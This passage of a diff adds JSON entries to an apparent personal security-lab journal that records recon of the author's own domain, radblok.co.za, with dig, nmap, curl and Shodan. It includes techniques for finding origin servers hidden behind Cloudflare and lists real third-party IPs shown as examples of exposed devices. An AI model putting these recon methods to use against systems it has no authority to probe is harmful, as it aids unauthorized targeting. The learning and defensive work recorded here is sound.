+            "text": "Ports 80 and 443 show **`Cloudflare http proxy`** and **`cloudflare`** as the service. Cloudflare was in none of the earlier data — not in whois, not in the dig A record, not in theHarvester results. It only appeared when nmap sent actual HTTP probes and read the response headers."
+          },
+          {
+            "t": "p",
+            "text": "This means Cloudflare is sitting as a **reverse proxy** in front of the application. Traffic hitting `216.24.57.1` on web ports is answered by Cloudflare's edge network, which then proxies legitimate requests through to the Render backend. Render itself uses Cloudflare at its ingress layer for all customers — or the app owner configured Cloudflare specifically."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "This is a major recon implication: **`216.24.57.1` is not the true origin IP of the application.** Cloudflare sits in between. The real backend IP is hidden behind Cloudflare's network. Any scan you do is hitting Cloudflare's edge, not the application server directly. To find the real origin you'd need to look for misconfigured DNS records, old A records, SSL cert SANs, or direct Render subdomains that bypass Cloudflare."
+          }
+        ]
+      },
+      {
+        "h": "Mail ports all filtered: the MX record is broken",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Entry 009 flagged that the MX record pointing to a Render IP was unusual. This scan confirms why: **ports 25, 465, and 587 are all filtered.** No mail daemon is accepting connections here."
+          },
+          {
+            "t": "p",
+            "text": "When another mail server tries to deliver email to `@radblok.co.za`, it looks up the MX record, finds `mail.radblok.co.za`, resolves it to `216.24.57.1`, then tries to connect on port 25 — and gets silently dropped by the firewall. **Inbound SMTP delivery to this domain is currently broken.** Any email sent to `@radblok.co.za` will time out and bounce."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "This is an action item for the domain owner (me): either point the MX record at a real mail service (Zoho Mail, Google Workspace, or a transactional provider like Mailgun/SendGrid that provides SMTP receive), or remove the MX record entirely if email isn't needed. A dangling MX pointing at a Cloudflare/Render node that blocks SMTP just means all inbound mail bounces silently."
+          }
+        ]
+      },
+      {
+        "h": "The full architecture — updated",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Layer",
+              "Provider",
+              "Visible in"
+            ],
+            "rows": [
+              [
+                "Domain registration",
+                "xneelo (Pty) Ltd",
+                "whois"
+              ],
+              [
+                "DNS management",
+                "xneelo / host-h.net nameservers",
+                "whois"
+              ],
+              [
+                "CDN / reverse proxy",
+                "**Cloudflare**",
+                "nmap service detection only"
+              ],
+              [
+                "Application hosting",
+                "**Render.com**",
+                "reverse DNS (`dig -x`)"
+              ],
+              [
+                "Mail (inbound SMTP)",
+                "**Nobody** — all ports filtered",
+                "nmap port scan"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "Three completely separate providers — and the only way to see all of them was to combine whois, dig, theHarvester, dig -x, and nmap. No single tool showed the full picture."
+          }
+        ]
+      },
+      {
+        "h": "What `-sV` actually does",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "`-sV` tells nmap to do **service/version detection** — after finding an open port, it sends probes and reads banners to identify what software is listening. Without `-sV`, nmap would just report port 80 as `open http` from the port number alone. With it, nmap saw `Cloudflare http proxy` in the response — which completely changes the picture."
+          },
+          {
+            "t": "code",
+            "label": "comparison",
+            "text": "# Without -sV: port number tells you the protocol\nnmap -p 80 216.24.57.1\n# → 80/tcp open http\n\n# With -sV: probe reads the actual banner\nnmap -sV -p 80 216.24.57.1\n# → 80/tcp open http Cloudflare http proxy"
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "`-sV` makes scans slower (it has to send extra probes and wait for responses) but gives dramatically more useful output. Always use it when you actually want to know what's running, not just whether a port is open."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "nmap confirmed: Cloudflare is the proxy layer — not visible in whois or dig, only in service banners.",
+              "`216.24.57.1` is Cloudflare/Render ingress — **not the true origin IP** of the application.",
+              "All mail ports filtered — inbound SMTP to `@radblok.co.za` currently bounces. The MX record is broken.",
+              "Full stack: xneelo (DNS) → Cloudflare (proxy) → Render (app). Three separate providers.",
+              "Understood `-sV`: service detection reads banners, not just port numbers — always worth using.",
+              "**Action item on domain**: fix or remove the MX record. Either point to a real mail provider or delete it.",
+              "Next recon step: look for Render's direct subdomain for the app (e.g. `radblok.onrender.com`) — that would bypass Cloudflare and expose the real origin."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 11,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "Chasing the origin: Render runs on GCP, Cloudflare is infrastructure",
+    "tags": [
+      "nmap",
+      "dig",
+      "recon",
+      "cloudflare",
+      "render",
+      "gcp",
+      "cname",
+      "radblok"
+    ],
+    "summary": "Checked radblok.onrender.com to try to find the real origin IP behind Cloudflare. The CNAME chain revealed Render runs on Google Cloud Platform (GCP US West 1) and routes all traffic through Cloudflare at the infrastructure level — it's not per-customer configuration, it's Render's own setup. There is no public path around Cloudflare to the real application server.",
+    "sections": [
+      {
+        "h": "The full CNAME chain",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ dig radblok.onrender.com A +short\ngcp-us-west1-1.origin.onrender.com.\ngcp-us-west1-1.origin.onrender.com.cdn.cloudflare.net.\n216.24.57.18\n216.24.57.16"
+          },
+          {
+            "t": "p",
+            "text": "`dig` is showing the full resolution chain, not just the final answer. Reading top to bottom:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Step",
+              "Record",
+              "What it means"
+            ],
+            "rows": [
+              [
+                "1",
+                "`radblok.onrender.com` → CNAME → `gcp-us-west1-1.origin.onrender.com`",
+                "Render maps the app subdomain to a regional origin cluster"
+              ],
+              [
+                "2",
+                "`gcp-us-west1-1.origin.onrender.com` → CNAME → `…cdn.cloudflare.net`",
+                "That origin cluster is itself behind Cloudflare's CDN — Render's own infrastructure layer"
+              ],
+              [
+                "3",
+                "`…cdn.cloudflare.net` → A → `216.24.57.18`, `216.24.57.16`",
+                "Two IPs — load balancing across multiple Cloudflare/Render ingress nodes"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "The CNAME chain is the most information-dense part of this whole investigation. One `dig` command reveals the entire stack: Render → GCP → Cloudflare → two IPs."
+          }
+        ]
+      },
+      {
+        "h": "GCP US West 1 — the underlying platform",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "`gcp-us-west1-1` is not decoration — it's a real infrastructure label. Breaking it down:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Part",
+              "Meaning"
+            ],
+            "rows": [
+              [
+                "`gcp`",
+                "Google Cloud Platform — Render's underlying compute provider"
+              ],
+              [
+                "`us-west1`",
+                "GCP's US West 1 region — Oregon, USA"
+              ],
+              [
+                "`1`",
+                "Cluster or node number within that region"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "So the stack is: **app → Render (managed PaaS) → GCP US West 1 (underlying VMs) → Cloudflare (CDN/proxy)**. Three layers of infrastructure, all surfaced by reading the CNAME chain."
+          }
+        ]
+      },
+      {
+        "h": "Cloudflare is Render's infrastructure, not the app owner's choice",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "The `.cdn.cloudflare.net` CNAME is on `gcp-us-west1-1.origin.onrender.com` — a Render-controlled hostname. This is Render's own DNS record, not something configured per customer. Every application hosted on Render goes through Cloudflare whether the app owner set it up or not."
+          },
+          {
+            "t": "p",
+            "text": "This means **there is no public path around Cloudflare** to the real application origin. The nmap on `216.24.57.16` still shows `Cloudflare http proxy` — even the 'origin' subdomain terminates at Cloudflare's edge, not at the actual GCP VM running the app. The real backend only receives traffic forwarded by Cloudflare internally."
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "In a real pentest against a Cloudflare-protected target, the main technique for finding the origin is: look for old DNS records before Cloudflare was added (SecurityTrails, historical whois), check SSL cert SANs for alternative hostnames, scan adjacent IPs in the same /24 for the same TLS cert, and look for direct cloud provider subdomains (like `*.onrender.com`). In this case — the onrender.com subdomain still terminates at Cloudflare, so even that didn't help."
+          }
+        ]
+      },
+      {
+        "h": "Two IPs — load balancing",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ dig -x 216.24.57.18 +short\nip-216-24-57-18.ingress.render.com.\n\n$ dig -x 216.24.57.16 +short\nip-216-24-57-16.ingress.render.com."
+          },
+          {
+            "t": "p",
+            "text": "Two IPs in the same `/24` subnet (`216.24.57.0/24`), both naming themselves `ingress.render.com`. DNS returning multiple A records is standard load balancing — clients pick one (usually the first), and if it fails, try the other. Different clients may get the IPs in different order."
+          },
+          {
+            "t": "p",
+            "text": "The first `dig -x` also hit a **DNS timeout from `10.28.119.151`** before resolving. That IP is the Honor X8 hotspot's DNS server (the gateway it hands out via DHCP). The hotspot's DNS is occasionally slow or flaky — the query eventually succeeded through a retry or fallback. Not a concern, but worth knowing: `10.28.119.151` is your lab's current upstream DNS resolver."
+          }
+        ]
+      },
+      {
+        "h": "Complete picture: what we now know about radblok.co.za",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Layer",
+              "Provider",
+              "Detail",
+              "Found via"
+            ],
+            "rows": [
+              [
+                "Domain registration",
+                "xneelo",
+                "Origin2020 / ZA",
+                "whois"
+              ],
+              [
+                "DNS management",
+                "xneelo / host-h.net",
+                "ns1/ns2.host-h.net + dns-h.com",
+                "whois"
+              ],
+              [
+                "CDN / proxy",
+                "Cloudflare",
+                "Baked into Render's infra — not optional",
+                "nmap banner + CNAME chain"
+              ],
+              [
+                "App hosting",
+                "Render.com",
+                "GCP US West 1, ingress cluster `gcp-us-west1-1`",
+                "dig CNAME chain"
+              ],
+              [
+                "Underlying cloud",
+                "Google Cloud Platform",
+                "US West 1 region (Oregon)",
+                "CNAME label"
+              ],
+              [
+                "Mail (inbound)",
+                "Nobody — SMTP filtered",
+                "MX points here but no SMTP daemon",
+                "nmap port scan"
+              ],
+              [
+                "True origin IP",
+                "Unknown — hidden",
+                "Behind Cloudflare's internal network",
+                "Not reachable"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "This took seven separate tools and techniques across four lab sessions to build: whois → theHarvester → dig MX → dig A → dig -x → nmap -sV → dig CNAME chain. No single tool would have shown all of it."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "CNAME chain from `radblok.onrender.com` revealed full stack: Render → GCP US West 1 → Cloudflare.",
+              "Cloudflare is Render's own infrastructure — every Render app uses it, not per-customer config.",
+              "No public path to the true origin IP. Cloudflare intercepts all traffic at the edge.",
+              "Two load-balanced IPs: `216.24.57.16` and `216.24.57.18`, both `ingress.render.com`.",
+              "Hotspot DNS (`10.28.119.151`) timed out once on a PTR lookup — minor, expected on a mobile hotspot.",
+              "**MX record is still broken** — action item remains: fix or remove it.",
+              "Recon of radblok.co.za is complete at the passive/light-active level. Next topic or move to a deliberately vulnerable target (DVWA/Metasploitable) for active scanning practice."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 12,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "Application-layer recon: Header analysis leaks Render state & Cloudflare PoP",
+    "tags": [
+      "recon",
+      "curl",
+      "headers",
+      "cloudflare",
+      "render",
+      "http-status",
+      "radblok"
+    ],
+    "summary": "HTTP header inspection via curl revealed critical infrastructure behaviors: Cloudflare terminates traffic locally at the Cape Town PoP (CPT), apex radblok.co.za redirects to www with a 301, the web service returns HTTP 503 with 'x-render-routing: suspend-by-user' proving the service was manually suspended in Render, and radblok.onrender.com returns HTTP 404 with 'x-render-routing: no-server' disclosing slug de-allocation.",
+    "sections": [
+      {
+        "h": "The curl probe & response",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ curl -IL https://radblok.co.za\nHTTP/2 301 \ndate: Thu, 01 Oct 2026 19:10:08 GMT\ncontent-type: text/html; charset=utf-8\nlocation: https://www.radblok.co.za/\ncf-cache-status: DYNAMIC\nserver: cloudflare\ncf-ray: a43dc3fecfbb039a-CPT\nalt-svc: h3=\":443\"; ma=86400\n\nHTTP/2 503 \ndate: Thu, 01 Oct 2026 19:10:09 GMT\ncontent-type: text/html; charset=utf-8\ncontent-length: 256\nx-render-routing: suspend-by-user\ncf-cache-status: DYNAMIC\nserver: cloudflare\ncf-ray: a43dc408383bbf11-CPT\nalt-svc: h3=\":443\"; ma=86400"
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ curl -IL https://radblok.onrender.com\nHTTP/2 404 \ndate: Thu, 01 Oct 2026 19:10:37 GMT\ncontent-type: text/plain; charset=utf-8\ncontent-length: 10\nx-content-type-options: nosniff\nx-render-routing: no-server\ncf-cache-status: DYNAMIC\nserver: cloudflare\ncf-ray: a43dc4b83a3abf11-CPT\nalt-svc: h3=\":443\"; ma=86400"
+          }
+        ]
+      },
+      {
+        "h": "Key findings from response headers",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Header / Signal",
+              "Value",
+              "Recon & Security Meaning"
+            ],
+            "rows": [
+              [
+                "`cf-ray`",
+                "`...-CPT`",
+                "**Cape Town Point of Presence (PoP)**. Even though Render's origin VMs reside in GCP US West 1 (Oregon), Cloudflare terminates TLS locally in South Africa (CPT airport code) to optimize edge latency."
+              ],
+              [
+                "`x-render-routing`",
+                "`suspend-by-user`",
+                "**Application State Disclosure**. Render custom header confirms the target service exists on Render but has been manually suspended/paused by the account owner."
+              ],
+              [
+                "`x-render-routing` (onrender)",
+                "`no-server`",
+                "**Subdomain Mismatch / Slug De-allocation**. `radblok.onrender.com` does not have an active service bound to that exact slug; the service may use a generated hash slug or only bind the custom domain."
+              ],
+              [
+                "`location`",
+                "`https://www.radblok.co.za/`",
+                "**Apex-to-WWW Canonicalization**. The apex domain redirects to `www` via HTTP 301."
+              ],
+              [
+                "`alt-svc`",
+                "`h3=\":443\"; ma=86400`",
+                "**HTTP/3 (QUIC) Supported**. Cloudflare advertises HTTP/3 availability over UDP port 443."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Missing security headers audit",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Examining the HTTP/2 503 response reveals an absence of standard defensive HTTP security headers:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Header",
+              "Status",
+              "Risk / Function"
+            ],
+            "rows": [
+              [
+                "`Strict-Transport-Security` (HSTS)",
+                "Missing",
+                "Browsers are not instructed to enforce HTTPS-only connections for future visits."
+              ],
+              [
+                "`Content-Security-Policy` (CSP)",
+                "Missing",
+                "No policy defining trusted sources for scripts, frames, or styles."
+              ],
+              [
+                "`X-Frame-Options`",
+                "Missing",
+                "No explicit protection against clickjacking/framing (unless defined by HTML meta tags)."
+              ],
+              [
+                "`X-Content-Type-Options`",
+                "Missing on 503 (present on 404)",
+                "Lacks protection against MIME-sniffing attacks on the main error page."
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "When an application is suspended or served via proxy error pages, CDN/PaaS default error responders often omit custom application security headers configured inside the backend app code."
+          }
+        ]
+      },
+      {
+        "h": "Lab status & takeaways",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Layer 7 recon successfully extracted operational state without invasive scanning.",
+              "`x-render-routing: suspend-by-user` confirms the backend project status on Render.",
+              "Cloudflare's edge PoP (`CPT` / Cape Town) confirmed geographic edge routing.",
+              "Next step: Inspect TLS certificate details and Subject Alternative Names (SANs) to see what other hostnames are bound to the certificate."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 13,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "TLS Certificate analysis: Google Trust Services, ECDSA 256, and isolated SAN",
+    "tags": [
+      "recon",
+      "nmap",
+      "ssl-cert",
+      "tls",
+      "gts",
+      "ecdsa",
+      "radblok"
+    ],
+    "summary": "Nmap's ssl-cert script inspected the TLS certificate for www.radblok.co.za. The certificate is issued by Google Trust Services (WE1 CA) using modern 256-bit Elliptic Curve Cryptography (ECDSA) with a 90-day automated ACME lifecycle (Sept 20 to Dec 19, 2026). The Subject Alternative Name (SAN) contains only DNS:www.radblok.co.za, indicating isolated single-domain certificate issuance rather than a shared wildcard.",
+    "sections": [
+      {
+        "h": "The ssl-cert scan output",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ nmap -p 443 --script ssl-cert www.radblok.co.za\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-cert: Subject: commonName=www.radblok.co.za\n| Subject Alternative Name: DNS:www.radblok.co.za\n| Issuer: commonName=WE1/organizationName=Google Trust Services/countryName=US\n| Public Key type: ec\n| Public Key bits: 256\n| Signature Algorithm: ecdsa-with-SHA256\n| Not valid before: 2026-09-20T08:33:33\n| Not valid after:  2026-12-19T09:33:29\n|_SHA-256: 3054 cc83 47fb 3b0f b9e0 969b afb7 2d0d 9317 0e6d 9b3d 24af ddae 7479 8421 37e4"
+          }
+        ]
+      },
+      {
+        "h": "Breaking down the certificate details",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Certificate Field",
+              "Observed Value",
+              "Technical & Recon Implication"
+            ],
+            "rows": [
+              [
+                "**Issuer**",
+                "`WE1 / Google Trust Services (US)`",
+                "Google Trust Services is an automated ACME Certificate Authority. Cloudflare and Render integrate GTS alongside Let's Encrypt for automatic TLS provisioning."
+              ],
+              [
+                "**Public Key & Algorithm**",
+                "`EC 256-bit / ecdsa-with-SHA256`",
+                "Modern Elliptic Curve Cryptography (ECC / prime256v1). ECDSA provides equivalent security to RSA 3072-bit with substantially smaller key sizes, lower CPU overhead, and faster TLS handshakes on mobile devices."
+              ],
+              [
+                "**Subject Alternative Name (SAN)**",
+                "`DNS:www.radblok.co.za`",
+                "**No Wildcards or Leaked Staging Subdomains**. The certificate covers strictly `www.radblok.co.za`. It does not include `radblok.co.za` or any internal/dev hostnames in this specific cert, showing targeted per-hostname provisioning."
+              ],
+              [
+                "**Validity Window**",
+                "`2026-09-20` to `2026-12-19` (90 days)",
+                "Standard 90-day automated lifecycle. Issued recently on September 20, managed via automated background renewal."
+              ],
+              [
+                "**rDNS Association**",
+                "`216.24.57.1` &rarr; `ip-216-24-57-1.ingress.render.com`",
+                "Adds a third ingress IP in the `216.24.57.0/24` subnet alongside the `.16` and `.18` addresses discovered in Entry 011."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Why SAN inspection matters in recon",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "In security assessments, inspecting the Subject Alternative Name (SAN) field is a key technique for discovering hidden attack surfaces. Multi-domain certificates or wildcards often bundle related hostnames together, such as `admin.target.com`, `vpn.target.com`, or `dev-backend.target.com`."
+          },
+          {
+            "t": "p",
+            "text": "Here, Render/Cloudflare requested a tightly scoped single-name certificate solely for `www.radblok.co.za`, leaving no ancillary hostnames exposed in the SAN."
+          }
+        ]
+      },
+      {
+        "h": "Lab status & next step",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "TLS profile completed: ECDSA 256-bit issued by Google Trust Services (WE1).",
+              "SAN contains only `www.radblok.co.za` (clean, tight scope).",
+              "Next logical step: Test how the apex `radblok.co.za` presents its certificate, or inspect HTTP response body content / robots.txt on `www.radblok.co.za`."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 14,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "Dual independent certs & catch-all platform interception",
+    "tags": [
+      "recon",
+      "ssl-cert",
+      "tls",
+      "acme",
+      "render",
+      "robots.txt",
+      "radblok"
+    ],
+    "summary": "Probing the apex domain certificate confirmed Render/Cloudflare maintains two separate, independently provisioned GTS ECDSA certificates rather than a unified multi-SAN certificate. Furthermore, requesting /robots.txt returned Render's HTML suspension page, proving the platform ingress intercepts all URI paths before they reach the web application layer.",
+    "sections": [
+      {
+        "h": "Apex certificate comparison",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ nmap -p 443 --script ssl-cert radblok.co.za\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-cert: Subject: commonName=radblok.co.za\n| Subject Alternative Name: DNS:radblok.co.za\n| Issuer: commonName=WE1/organizationName=Google Trust Services/countryName=US\n| Public Key type: ec (256 bits, ecdsa-with-SHA256)\n| Not valid before: 2026-09-19T14:01:11\n| Not valid after:  2026-12-18T15:01:09\n|_SHA-256: 5a3b c635 afcb 0794 ..."
+          },
+          {
+            "t": "table",
+            "head": [
+              "Attribute",
+              "Apex (`radblok.co.za`)",
+              "Subdomain (`www.radblok.co.za`)"
+            ],
+            "rows": [
+              [
+                "Subject CN",
+                "`radblok.co.za`",
+                "`www.radblok.co.za`"
+              ],
+              [
+                "SAN",
+                "`DNS:radblok.co.za`",
+                "`DNS:www.radblok.co.za`"
+              ],
+              [
+                "Issued At",
+                "`2026-09-19 14:01:11`",
+                "`2026-09-20 08:33:33` (~18h later)"
+              ],
+              [
+                "Expires At",
+                "`2026-12-18`",
+                "`2026-12-19`"
+              ],
+              [
+                "SHA-256 Hash",
+                "`5a3b...`",
+                "`3054...`"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "This confirms automated micro-provisioning: Render/Cloudflare's ACME agent requests isolated, single-host certificates for each domain custom entry. The apex was registered and validated first on September 19, and the `www` record was validated and issued separately on September 20."
+          }
+        ]
+      },
+      {
+        "h": "Path interception: /robots.txt returns suspension HTML",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ curl -s https://www.radblok.co.za/robots.txt\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <title>Service Suspended</title>\n</head>\n<body>\nThis service has been suspended by its owner.\n</body>\n</html>"
+          },
+          {
+            "t": "p",
+            "text": "Instead of a standard plain text `robots.txt` document, the server returns the HTML `Service Suspended` page."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "**Recon & Fuzzing Implication**: In this state, any web crawler, content discovery tool, or directory fuzzer (such as `ffuf`, `dirsearch`, or `gobuster`) will fail or report false positives. The platform edge proxy intercepts every incoming URI before it touches any application router, returning a uniform HTTP 503 response across all routes."
+          }
+        ]
+      },
+      {
+        "h": "Passive & web recon wrap-up",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "With this scan, the reconnaissance against `radblok.co.za` has reached its ceiling without modifying infrastructure or resuming the container:"
+          },
+          {
+            "t": "list",
+            "items": [
+              "DNS/Whois mapped: xneelo registrar, host-h nameservers, dangling MX record to Render.",
+              "Cloud Infrastructure: Render.com PaaS running on GCP US West 1 (Oregon).",
+              "Edge Network: Cloudflare proxy terminating in Cape Town (CPT PoP).",
+              "Crypto: Dedicated 256-bit ECDSA certificates issued via Google Trust Services (WE1) for each hostname.",
+              "Application State: Service suspended at Render ingress; all Layer 7 paths return uniform HTTP 503 platform catch-all."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 15,
+    "date": "2026-10-02",
+    "module": "Reconnaissance & scanning",
+    "title": "Shodan: The search engine for internet-connected devices and banner leaks",
+    "tags": [
+      "shodan",
+      "osint",
+      "recon",
+      "banners",
+      "iot",
+      "default-passwords",
+      "redis"
+    ],
+    "summary": "Queried Shodan for 'default password' to analyze how passive internet-wide scanners collect and index device banners. The query surfaced over 18,000 publicly exposed systems globally without transmitting a single packet from the local machine. Breaking down the results revealed how devices inadvertently match (such as Redis protected-mode rejection banners, IoT web servers, and HP printers leaking hardware serial numbers in HTTP headers), illustrating the critical risks of banner information disclosure and unintended WAN exposure.",
+    "sections": [
+      {
+        "h": "Shodan vs Active Scanning (Nmap)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "In previous labs, Nmap performed **active reconnaissance** by transmitting TCP/UDP packets directly from the Kali VM to target ports. Shodan operates on an entirely different model: **passive reconnaissance via distributed crawlers**."
+          },
+          {
+            "t": "table",
+            "head": [
+              "Dimension",
+              "Nmap Active Scanning",
+              "Shodan Passive Recon"
+            ],
+            "rows": [
+              [
+                "**Traffic Generation**",
+                "Sends probes directly from your IP to the target host.",
+                "Zero packets sent to the target; queries Shodan's indexed database."
+              ],
+              [
+                "**Detection Risk**",
+                "Easily logged by target firewalls, IDS/IPS, and Cloudflare edge.",
+                "Completely invisible to the target organization."
+              ],
+              [
+                "**Scope & Speed**",
+                "Limited to targets and subnets you actively probe in real time.",
+                "Indexes the entire IPv4 address space continuously across thousands of ports."
+              ],
+              [
+                "**Data Freshness**",
+                "Live, real-time status at the exact moment of execution.",
+                "Historical snapshot from when Shodan's crawlers last inspected the host."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Deconstructing the 'default password' query results",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Running a broad query like `default password` searches across full raw banners, HTTP headers, error strings, and HTML bodies. The query produced 18,034 results globally, with high concentrations in Telnet (port 23), Redis (port 6379), and HTTP/HTTPS administrative interfaces (ports 80, 443, 8080)."
+          },
+          {
+            "t": "table",
+            "head": [
+              "Exposed Service / Banner",
+              "Why it Matched",
+              "Recon & Security Finding"
+            ],
+            "rows": [
+              [
+                "**HP Embedded Web Servers** (`85.139.238.231`, `74.88.244.79`)",
+                "HTTP header banner + setup documentation",
+                "The HTTP `Server` header leaks exact hardware model, serial number (`Serial Number: CN4AL466FM...`), and firmware build date on the public internet."
+              ],
+              [
+                "**Redis Database** (`46.62.131.141`, port 6379)",
+                "Error text contains: `...protected mode is enabled and no password is set for the default user...`",
+                "Database exposed directly to WAN. While protected mode prevented unauthorized external commands, database instances should never listen on public interfaces without firewall/VPN isolation."
+              ],
+              [
+                "**Synology DSM & IoT Webcams** (`58.253.76.4`)",
+                "Login portal strings & Let's Encrypt certs",
+                "Surfaces network-attached storage and webcams directly accessible from residential/ISP dynamic IP ranges."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Banner information disclosure risks",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "A key takeaway from inspecting raw banners is **gratuitous information leakage**. Look at this real header captured by Shodan from an office printer:"
+          },
+          {
+            "t": "code",
+            "label": "banner",
+            "text": "Server: HP HTTP Server; HP ENVY 5530 series - A9J40B; Serial Number: CN4AL466FM067B; Built:Mon Jun 08, 2020 08:12:12AM {ORL1CN2024AR}"
+          },
+          {
+            "t": "p",
+            "text": "In a single HTTP response, an attacker gains: the exact product model, firmware release date (2020), and hardware serial number. This enables targeted searches in vulnerability databases (CVEs) without needing to guess or brute-force software versions."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "**Defensive Rule**: Services should suppress verbose version banners (e.g. `ServerTokens Prod` in Apache, `server_tokens off` in Nginx). Administrative interfaces, printers, and internal databases should be restricted behind VPNs or local subnets rather than assigned public IPv4 addresses."
+          }
+        ]
+      },
+      {
+        "h": "Targeted Shodan search syntax",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "While broad keyword searches return interesting global patterns, precise recon uses structured filters to narrow results to specific targets:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Syntax",
+              "Targeted Objective",
+              "Practical Use Case"
+            ],
+            "rows": [
+              [
+                "`ssl.cert.subject.cn:\"radblok.co.za\"`",
+                "Certificate Common Name",
+                "Hunts for real origin IPs presenting the domain's TLS cert."
+              ],
+              [
+                "`ssl:\"radblok.co.za\" -org:\"Cloudflare, Inc.\"`",
+                "Cert search excluding CDN",
+                "Filters out CDN proxies to isolate direct origin servers."
+              ],
+              [
+                "`http.html:\"default password\" port:80,443`",
+                "Restricted body search",
+                "Limits matches strictly to HTML body text on web ports."
+              ],
+              [
+                "`net:216.24.57.0/24`",
+                "Subnet filter",
+                "Inspects all Shodan-indexed records across an entire IP block."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Lab status & summary",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Demonstrated how Shodan aggregates passive reconnaissance data across IPv4 without sending direct probes.",
+              "Analyzed 18,000+ exposed nodes, identifying why queries match banner error strings (Redis) and hardware headers (HP printers).",
+              "Documented how verbose server banners eliminate attacker guesswork and accelerate vulnerability mapping.",
+              "Next step: Apply targeted search filters (like `ssl.cert.subject.cn` or `host:`) against specific infrastructure."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 16,
+    "date": "2026-10-02",
+    "module": "Reconnaissance & scanning",
+    "title": "Subnet mapping in Shodan: 256 identical ingress nodes & zero origin cert leaks",
+    "tags": [
+      "shodan",
+      "osint",
+      "recon",
+      "subnet",
+      "cloudflare",
+      "render",
+      "sni",
+      "radblok"
+    ],
+    "summary": "Targeted Shodan queries against net:216.24.57.0/24 and ssl.cert.subject.cn produced extraordinary architectural clarity. Across the entire /24 subnet, exactly 256 hosts (100% of the IP space) expose identical Cloudflare proxy ports (80, 2082, 2086, 2087, 8880), confirming the whole block is a uniform Render/Cloudflare ingress fleet. Searching for the domain certificate returned zero results, proving Cloudflare's mandatory SNI prevents raw IP certificate harvesting and confirming no origin server has ever leaked the certificate directly to IPv4.",
+    "sections": [
+      {
+        "h": "The subnet query: net:216.24.57.0/24",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "shodan",
+            "text": "Query: net:216.24.57.0/24\nTotal Results: 2,723\nTop Ports:\n  80:   256 hosts\n  2082: 256 hosts\n  2086: 256 hosts\n  2087: 256 hosts\n  8880: 256 hosts\nOrganization: Render\nLocation: San Francisco, United States\nHostnames: ip-216-24-57-XYZ.ingress.render.com\nTag: cdn"
+          },
+          {
+            "t": "p",
+            "text": "Notice the mathematical symmetry in the port count: **exactly 256 hosts** listen on ports 80, 2082, 2086, 2087, and 8880. A standard `/24` IPv4 subnet contains exactly $2^8 = 256$ total addresses (`.0` through `.255`)."
+          }
+        ]
+      },
+      {
+        "h": "Why those specific ports? The Cloudflare proxy signature",
+        "blocks": [
